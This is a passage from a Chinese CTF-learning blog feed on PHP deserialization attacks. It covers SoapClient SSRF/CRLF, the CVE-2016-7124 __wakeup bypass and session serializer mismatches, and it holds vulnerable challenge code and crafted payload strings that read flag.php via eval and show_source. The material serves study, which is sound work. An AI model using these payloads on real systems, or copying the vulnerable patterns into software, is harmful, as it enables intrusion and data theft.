rel="noopener">php原生类-反序列化</a></p><p>php反序列化没有可利用的类时，可以调用php原生类,SoapClient就是其中一个</p><p>同时，__call也是SoapClient类其中的一个方法,举一个例子更好理解   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'http://127.0.0.1:5555'</span>, <span class="string">'location'</span>=&gt;<span class="string">'http://127.0.0.1:5555'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure><p>nc监听本地5555端口</p><p><img src="https://s2.ax1x.com/2019/11/06/MPHPoR.png" alt="image"></p><p>这个只对http/https协议有效，同时这里存在http头部存在crlf漏洞，也就是\r\n</p><h2 id="一道题的深思"><a href="#一道题的深思" class="headerlink" title="一道题的深思"></a>一道题的深思</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这题很多思路相连</p><p>session反序列化-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类</p><p>复现失败了，就学到这里吧,这里有几篇可以参考</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0</a></p><p><a href="https://www.anquanke.com/post/id/153065#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">https://www.jianshu.com/p/d4c304dbd0af</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11515519.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11515519.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近遇到了个题，然后由此引发了php原生类，最后引发了一道老题许多知识点的深思。。有些文章图床挂了，知识点很多有点乱，便总结一下&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化由浅入深</title>
    <link href="http://yoursite.com/2019/11/06/xuliehua/"/>
    <id>http://yoursite.com/2019/11/06/xuliehua/</id>
    <published>2019-11-06T15:57:00.267Z</published>
    <updated>2019-11-06T15:57:00.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到很多反序列化的例子，这里决定重温一下加深对反序列化的理解</p><h2 id="PHP序列化是什么"><a href="#PHP序列化是什么" class="headerlink" title="PHP序列化是什么"></a>PHP序列化是什么</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()     //将一个对象转换成一个字符串</span><br><span class="line">unserialize()   //将字符串还原成一个对象</span><br></pre></td></tr></table></figure><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'flag&#123;c132dgfa231&#125;'</span>;</span><br><span class="line">    <span class="keyword">public</span> $a = <span class="string">"aaa"</span>;</span><br><span class="line">    <span class="keyword">static</span> $b = <span class="string">"bbb"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test;</span><br><span class="line">$data = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">## O:4:"test":2:&#123;s:10:" test flag";s:17:"flag&#123;c132dgfa231&#125;";s:1:"a";s:3:"aaa";&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/30/K4BcO1.png" alt="image"></p><h3 id="序列化字符串含义"><a href="#序列化字符串含义" class="headerlink" title="序列化字符串含义"></a>序列化字符串含义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:10:&quot; test flag&quot;;s:17:&quot;flag&#123;c132dgfa231&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;</span><br><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot; : Object(对象)为4个字符即test</span><br><span class="line">:2 :对象属性个数为2</span><br><span class="line">&#123;&#125;中为属性字符数：属性值</span><br><span class="line">这里的testflag是因为private属性，会在两侧加空字节，所以长度为10</span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()//创建对象时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h2 id="实战题"><a href="#实战题" class="headerlink" title="实战题"></a>实战题</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$KEY = <span class="string">"D0g3!!!"</span>;</span><br><span class="line">$str = $_GET[<span class="string">'str'</span>];</span><br><span class="line"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>payload: <a href="http://localhost/test/index.php?str=s:7:%22D0g3!!!" target="_blank" rel="noopener">http://localhost/test/index.php?str=s:7:%22D0g3!!!</a>;</p><h3 id="0x02-反序列化对象注入"><a href="#0x02-反序列化对象注入" class="headerlink" title="0x02 反序列化对象注入"></a>0x02 反序列化对象注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="title">return</span> '' </span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span><br><span class="line">  show_source(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">  $file=base64_decode($_GET[<span class="string">'file'</span>]); </span><br><span class="line">  <span class="keyword">echo</span> unserialize($file); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>解题思路:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">O:5:&quot;SoFun&quot; 指的是 类：5个字符：SoFun</span><br><span class="line"></span><br><span class="line">:2:  指的是 有两个对象</span><br><span class="line"></span><br><span class="line">S:7:&quot;\00*\00file&quot;  指的是有个属性，有7个字符，名为\00*\00file</span><br><span class="line"></span><br><span class="line">s:8:&quot;flag.php&quot;  指的是属性值，有8个字符，值为flag.php</span><br><span class="line"></span><br><span class="line">这里$file是protected ，需要---&gt; \00*\00file 表示protected。S用---&gt;\00 只代表一个字符。用s---&gt;\00表示3个字符。所以s要大写</span><br><span class="line"></span><br><span class="line">\00代表ascii为0的值</span><br><span class="line"></span><br><span class="line">这里用CVE-2016-7124漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，即1改为2</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">"\\"</span>) === <span class="keyword">false</span> &amp;&amp; strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>) === <span class="keyword">false</span>)</span><br><span class="line">                show_source(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="keyword">new</span> SoFun();</span><br><span class="line">$result =  serialize($test);</span><br><span class="line">$str = <span class="string">'O:5:"SoFun":2:&#123;S:7:"\00*\00file";s:8:"flag.php";&#125;'</span>;</span><br><span class="line"><span class="comment">//echo $result;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/01/KHcqhj.png" alt="image"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twosmil1e</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $key = <span class="string">'twosmi1e'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;key))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key == <span class="string">'twosmi1e'</span>)</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'you failed 23333'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line">    show_source(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line">    <span class="keyword">echo</span> $answer;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> unserialize($answer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twosmil1e</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $key = <span class="string">'twosmi1e'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;key))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key == <span class="string">'twosmi1e'</span>)</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'you failed 23333'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Twosmil1e();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x04-session-反序列化漏洞"><a href="#0x04-session-反序列化漏洞" class="headerlink" title="0x04 session 反序列化漏洞"></a>0x04 session 反序列化漏洞</h3><p>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化</p><p>php.ini<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path 设置session的存储路径</span><br><span class="line">session.save_handler 设定用户自定义存储函数</span><br><span class="line">session.auto_start 指定会话模块是否在请求开始时启动一个会话</span><br><span class="line">session.serialize_handler 定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure></p><h4 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h4><p>php中的session内容是以文件方式来存储的，由session.save_handler来决定。文件名由sess_sessionid命名，文件内容则为session序列化后的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = <span class="string">'twosmi1e'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>三种不同存储引擎为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;test123&quot;;&#125;     // php_serialize</span><br><span class="line"></span><br><span class="line">name|s:7:&quot;test123&quot;;                     // php</span><br><span class="line"></span><br><span class="line">0x04names:7:&quot;test123&quot;;              // php_binary</span><br><span class="line"></span><br><span class="line">php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</span><br><span class="line">php 键名＋竖线＋经过serialize()函数反序列处理的值</span><br><span class="line">php_serialize serialize()函数反序列处理数组方式</span><br><span class="line"></span><br><span class="line">三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</span><br></pre></td></tr></table></figure></p><h4 id="例题0x01-安洵杯"><a href="#例题0x01-安洵杯" class="headerlink" title="例题0x01 安洵杯"></a>例题0x01 安洵杯</h4><p><a href="https://blog.csdn.net/qq_39850969/article/details/84503901" target="_blank" rel="noopener">https://blog.csdn.net/qq_39850969/article/details/84503901</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Anti</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $info;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'aa'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(unserialize($_GET[<span class="string">'aa'</span>])==<span class="string">'phpinfo'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Anti</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $info;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = <span class="string">"show_source('flag.php');"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Anti();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:<a href="http://www.wyc.com/test/index.php?aa=O:4:%22Anti%22:1:{s:4:%22info%22;s:24:%22show_source(%27flag.php%27);%22;}" target="_blank" rel="noopener">http://www.wyc.com/test/index.php?aa=O:4:%22Anti%22:1:{s:4:%22info%22;s:24:%22show_source(%27flag.php%27);%22;}</a></p><h4 id="例题0x02-javris-oj"><a href="#例题0x02-javris-oj" class="headerlink" title="例题0x02 javris oj"></a>例题0x02 javris oj</h4><p><a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span 